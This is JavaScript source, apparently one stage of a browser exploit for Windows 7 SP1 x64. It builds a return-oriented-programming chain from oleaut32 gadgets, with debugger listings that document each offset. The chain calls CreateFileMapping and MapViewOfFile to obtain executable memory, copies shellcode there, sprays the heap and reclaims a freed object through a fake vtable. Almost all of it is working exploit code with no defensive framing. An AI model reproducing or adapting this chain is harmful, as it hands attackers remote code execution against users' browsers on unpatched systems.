
// ROP offsets relative to oleaut32 base
var stack_pivot_offset=0;					 
var read_from_ecx_into_eax_offset=0;
var write_to_ecx_from_eax_offset=0;
var call_eax_offset=0;
var pop_eax_offset=0;
var pop_ecx_offset=0;
var pop_ebp_offset=0;
var leave_offset=0;
var xor_eax_offset=0;
var inc_ecx_offset=0;
						 
var cfm_import_offset=0;
var mvf_import_offset=0;

/*
							
Win7 SP1 x64
Timestamp:        Fri Aug 26 21:18:50 2011 (4E58702A)
						
1:022:x86> ? 763b43e6 - oleaut32
Evaluate expression: 213990 = 000343e6
1:022:x86>
							
1:019:x86> !Exploiter find_import_function oleaut32 CreateFileMapping
[Exploiter] Import found 0x752913b4 that points to 
KERNEL32.dll!CreateFileMappingW (0x76a31909)
1:019:x86> !Exploiter find_import_function oleaut32 MapViewOfFile
[Exploiter] Import found 0x752913ac that points to 
KERNEL32.dll!MapViewOfFile (0x76a318f1)
							 
1:020:x86> u oleaut32+00058e2f L2
OLEAUT32!CPTLibTypeLibImpl::IsName+0x41:
752e8e2f bcfaff593b      mov     esp,3B59FFFAh
752e8e34 c3              ret
							 
1:019:x86> u oleaut32+0005a98e L3
OLEAUT32!ParamdescReadOrWrite+0x1e:
752ea98e ffd0            call    eax
752ea990 5d              pop     ebp
752ea991 c21000          ret     10h
							 
1:019:x86> u oleaut32+00024e41 L3
OLEAUT32!VarUI4FromDec+0x14:
752b4e41 58              pop     eax
752b4e42 03f6            add     esi,esi
752b4e44 c3              ret
1:019:x86>
							 
1:019:x86> u oleaut32+00043f8d L2
OLEAUT32!_CRT_INIT+0x1ff:
752d3f8d 59              pop     ecx
752d3f8e c3              ret
1:019:x86>
							 
1:019:x86> u oleaut32+00079066 L2
OLEAUT32!CTypeLib2::EnsureCustDataWriteable+0x16:
75309066 33c0            xor     eax,eax
75309068 c3              ret
1:019:x86>
							 
1:019:x86> u oleaut32+000751b3 L3
OLEAUT32!PARAM_DEFN::SetHlnam+0x19:
753051b3 8901            mov     dword ptr [ecx],eax
753051b5 5d              pop     ebp
753051b6 c20400          ret     4
							 
1:019:x86> u oleaut32+00023308 L2
OLEAUT32!CRgPv::Count:
752b3308 8b01            mov     eax,dword ptr [ecx]
752b330a c3              ret
							 
1:022:x86> u oleaut32+00004ab4 L2
OLEAUT32!operator new+0xd:
76874ab4 5d              pop     ebp
76874ab5 c3              ret
1:022:x86>
							 
1:022:x86> u oleaut32+0007f891 L2
OLEAUT32!__report_gsfailure+0xe0:
768ef891 c9              leave
768ef892 c3              ret
1:022:x86>
							
1:020:x86> u oleaut32+000750f7 L4
OLEAUT32!TYPE_DATA::SetIsSimpleTypeAlias+0x13:
768e50f7 41              inc     ecx
768e50f8 40              inc     eax
768e50f9 5d              pop     ebp
768e50fa c20400          ret     4
1:020:x86>
							 
*/

function stage2_win7_sp1_4E58702A(base_addr,target) {
				
		stack_pivot_offset=0x00058e2f;
					 
		read_from_ecx_into_eax_offset=0x23308;
		write_to_ecx_from_eax_offset=0x751b3;
		call_eax_offset=0x5a98e;
		pop_eax_offset=0x24e41;
		pop_ecx_offset=0x43f8d;
		pop_ebp_offset=0x4ab4;
		leave_offset=0x7f891;
		xor_eax_offset=0x79066;
		inc_ecx_offset=0x750f7;
							 
		cfm_import_offset=0x13b4;
		mvf_import_offset=0x13ac;		
		
       var counter;
   	   var str;
		
	   // Create ROP with leaked base
	   var big_rop2="";
	   var rop2="";
	   
	   while (rop2.length<((vtable_offset)/2)) rop2+="\uBBBB";
	   rop2+=my_escape(base_addr+stack_pivot_offset);
	   
	   // Stage2: CreateFileMappin -> MapViewOfFile -> memcpy -> 
shellcode
	   rop2+=my_escape(base_addr+xor_eax_offset);
	   
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(vtable_addr2+0x98); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	   
	   rop2+=my_escape(vtable_addr2+0xA0); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	
	   rop2+=my_escape(vtable_addr2+0xA8); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4

	   rop2+=my_escape(vtable_addr2+0x9E); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4	

	   rop2+=my_escape(vtable_addr2+0xA2); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4		   
	   
	   rop2+=my_escape(base_addr+cfm_import_offset);
	   rop2+=my_escape(base_addr+read_from_ecx_into_eax_offset);	   
	   
	   rop2+=my_escape(base_addr+call_eax_offset);
	   
	   // Call CreateFileMapping
	   rop2+=my_escape(0xFFFFFFFF); // Param 1
	   rop2+=my_escape(0xAAAAAAAA); // Param 2 will get NULL 
overwriten with above rop
	   rop2+=my_escape(0xAAAA0040); // Param 3 will get partial NULL 
overwriten with above rop
	   rop2+=my_escape(0xAAAAAAAA); // Param 4 will get NULL 
overwriten with above rop
	   rop2+=my_escape(0x0002AAAA); // Param 5 will get partial NULL 
overwriten with above rop
	   rop2+=my_escape(0xAAAAAAAA); // Param 6 will get NULL 
overwriten with above rop
	   
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 10
	   rop2+=my_escape(0xBBBBBBBB);
	   rop2+=my_escape(0xBBBBBBBB);
	   rop2+=my_escape(0xBBBBBBBB);

	   // Patch EAX -> hFile
	   rop2+=my_escape(vtable_addr2+0x138); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+xor_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   // Patch NULL args
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(vtable_addr2+0x13E); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(vtable_addr2+0x140); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(vtable_addr2+0x144); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(vtable_addr2+0x146); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(base_addr+mvf_import_offset);
	   rop2+=my_escape(base_addr+read_from_ecx_into_eax_offset);
	   
	   rop2+=my_escape(base_addr+call_eax_offset);
	   
	   // Call MapViewOfFile
	   rop2+=my_escape(0xBBBBBBBB);  // Param 1 handle will get 
overwriten with above rop 
	   rop2+=my_escape(0xAAAA0022);  // Param 2 will get partial 
NULL overwriten with above rop
	   rop2+=my_escape(0xAAAAAAAA);  // Param 3 will get NULL 
overwriten with above rop
	   rop2+=my_escape(0xAAAAAAAA);  // Param 4 will get NULL 
overwriten with above rop
	   rop2+=my_escape(0x0002AAAA);  // Param 5 will get partial 
NULL overwriten with above rop
	   
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 10
	   rop2+=my_escape(0xBBBBBBBB);
	   rop2+=my_escape(0xBBBBBBBB);
	   rop2+=my_escape(0xBBBBBBBB);
	   

	   // Patch EAX -> address (3 timesw)
	   rop2+=my_escape(vtable_addr2+0x1A0); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4	
	   
	   rop2+=my_escape(vtable_addr2+0x23C); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	   
       rop2+=my_escape(vtable_addr2+0x244); // ecx
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   // Write memcpy to exec page...
	   
	   rop2+=my_escape(0xDADADADA);   // to be overwritten with 
above rop
	   rop2+=my_escape(base_addr+pop_eax_offset);
	   rop2+=my_escape(0xc9335e5f);  // pop edi; pop esi; xor 
ecx,ecx; mov ch,0x8; rep movsd
	   
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4	
	
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+pop_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // retn 4
	   
	   rop2+=my_escape(0xC78308B5);  // pop edi; pop esi; xor 
ecx,ecx; mov ch,0x8; rep movsd
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB);  // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4

//--	   
	   
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	   
	   rop2+=my_escape(0xBBBBBBBB);; // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	   
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+inc_ecx_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	   
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(base_addr+pop_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	   
	   rop2+=my_escape(0xa5f3900C);  // pop edi; pop esi; xor 
ecx,ecx; mov ch,0x8; rep movsd
	   rop2+=my_escape(base_addr+write_to_ecx_from_eax_offset);
	   rop2+=my_escape(0xBBBBBBBB); // ebp
	   rop2+=my_escape(0xDADADADA); // to be overwritten with above 
rop... address to jmp where shellcode reside
	   rop2+=my_escape(0xBBBBBBBB); // retn 4
	   
	   
	   rop2+=my_escape(0xDADADADA); // edi: to be overwritten with 
above rop... shellcode location
	   rop2+=my_escape(vtable_addr2+0x24C); // esi: address of the 
shellcode 0x280a026c
	   
/* 

Final exec pages will look like 
	   
1:021:x86> ub eip Ld
1b9d0000 5f              pop     edi
1b9d0001 5e              pop     esi
1b9d0002 33c9            xor     ecx,ecx
1b9d0004 b508            mov     ch,8
1b9d0006 83c70c          add     edi,0Ch
1b9d0009 90              nop
1b9d000a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
1b9d000c 33c0            xor     eax,eax
1b9d000e 648b6004        mov     esp,dword ptr fs:[eax+4]
1b9d0012 83ec10          sub     esp,10h
1b9d0015 90              nop
1b9d0016 90              nop
1b9d0017 90              nop
1:021:x86> u eip
1b9d0018 cc              int     3   <------ our shellcode...
1b9d0019 cc              int     3
1b9d001a cc              int     3
1b9d001b cc              int     3
1b9d001c cc              int     3
1b9d001d cc              int     3
1b9d001e cc              int     3
1b9d001f cc              int     3
1:021:x86> !vprot eip
BaseAddress:       000000001b9d0000
AllocationBase:    000000001b9d0000
AllocationProtect: 00000040  PAGE_EXECUTE_READWRITE
RegionSize:        0000000000020000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00040000  MEM_MAPPED
1:019:x86> .exr -1
ExceptionAddress: 000000001baa0018
   ExceptionCode: 4000001f (WOW64 breakpoint)
  ExceptionFlags: 00000000
NumberParameters: 1
   Parameter[0]: 0000000000000000
1:019:x86>

*/
	   
	   // Shellcode
	   rop2+=restore_esp+shellcode;
		
	   while (rop2.length<((0x1000/2)-19)) rop2+="\uBBBB";
	   
	   // Stage 1: Rop to set ESP=vtable_addr2+vtable_offset+4
  	   rop2+=my_escape(base_addr+pop_ebp_offset);
	   rop2+=my_escape(vtable_addr2+vtable_offset); // new ESP dword 
aligned not to mess with Kernel
	   rop2+=my_escape(base_addr+leave_offset);
	   
	   while (rop2.length<(0x1000/2)) rop2+="\uBBBB";
	   
	   // 1 MB rop to avoid "OUT OF MEMROY" errors
	   for(counter=0;counter<255;counter++) big_rop2+=rop2;
       //Last concat not too exceed page boundary and leave a 0x10000 
unallocated gap
	   big_rop2+=rop2.substr(0,rop2.length-18);
	   
	   // Spray 
	   for (counter=0;counter<mb_spray2;counter++) {
			var element=document.createElement("div");
			element.setAttribute("title",big_rop2);
			memory.push(element);
			//alert(memory.length);
	   }
	   		  
	   // Try to get the block again with new vtable...
	   str=my_escape(vtable_addr2);
     
       while (str.length < obj_size) str=str+str;
       str=str.substr(0,(obj_size-2)/2);

	    for (counter=0;counter<num_obj;counter++) {
            vault[counter].setAttribute("title",str);
        }
			
		
		target.outerHTML;
	
	    window.setTimeout("keep_spray()",100*1000);

          
}

